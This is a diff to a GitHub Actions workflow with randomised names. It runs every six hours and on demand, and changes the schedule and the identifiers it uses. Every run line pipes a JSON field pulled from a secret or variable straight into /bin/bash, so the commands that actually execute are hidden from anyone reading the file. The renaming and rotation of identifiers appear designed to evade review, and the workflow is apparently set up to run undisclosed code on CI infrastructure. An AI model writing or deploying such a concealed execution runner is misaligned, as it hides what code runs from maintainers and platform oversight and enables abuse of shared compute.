@@ -1,29 +1,30 @@
 name: weijinshen6789
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 4/6 * * *'
+    - cron: '41 3/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: weijinshen6789
         env:
-          dardb9: ${{ secrets.dardb9 }}
+          n330: ${{ secrets.n330 }}
         run: |
-          echo $dardb9 | jq -r .ysdl17607 | /bin/bash
-          echo $cfsz16754 | jq -r .wokny4921 | /bin/bash
-          echo $p97 | jq -r .jqxns3 | /bin/bash
-          echo $xtlp7 | jq -r .kv3 | /bin/bash
-          echo $czw76 | jq -r .hqgn20 | /bin/bash
-          echo $e5332 | jq -r .qpqi707 | /bin/bash
-          echo $rh91807 | jq -r .okpm3742 | /bin/bash
-          echo $sn81434 | jq -r .q032 | /bin/bash
-          echo $gt6 | jq -r .tyn1 | /bin/bash
-          echo $gzr4167 | jq -r .qjkwd85 | /bin/bash
-          echo $cb3477 | jq -r .hni4121 | /bin/bash
-          echo $n0523 | jq -r .k0850 | /bin/bash
-          echo $b6 | jq -r .rt86641 | /bin/bash
+          echo $n330 | jq -r .rbei0285 | /bin/bash
+          echo $ant20262 | jq -r .jea3 | /bin/bash
+          echo $iif5419 | jq -r .mdacs35209 | /bin/bash
+          echo $s13 | jq -r .d0753 | /bin/bash
+          echo $fcaqo313 | jq -r .khmdc65557 | /bin/bash
+          echo $kogdl107 | jq -r .hn4617 | /bin/bash
+          echo $t10990 | jq -r .y666 | /bin/bash
+          echo $mnn9 | jq -r .m71 | /bin/bash
+          echo $qhtf93 | jq -r .udz54444 | /bin/bash
+          echo $ivjhj4 | jq -r .agj8076 | /bin/bash
+          echo $tkr6468 | jq -r .grq6 | /bin/bash
+          echo $jz58657 | jq -r .ldpmr92212 | /bin/bash
+          echo $loj2 | jq -r .nvss22947 | /bin/bash
 
